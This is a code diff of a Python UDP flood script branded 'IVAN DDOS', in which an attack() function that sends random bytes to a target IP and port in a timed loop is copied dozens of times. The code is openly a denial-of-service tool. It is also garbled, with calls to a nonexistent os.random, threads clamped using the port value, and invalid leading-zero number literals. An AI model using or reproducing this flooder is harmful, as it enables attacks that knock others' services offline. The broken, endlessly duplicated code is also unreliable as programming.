-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -20207,225 +15819,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -20801,7 +16195,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -20833,7 +16227,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -20865,7 +16259,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -20897,7 +16291,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -20929,7 +16323,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -20955,7 +16349,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -20987,39 +16381,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -21051,7 +16413,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -21083,415 +16445,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -21523,225 +16477,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
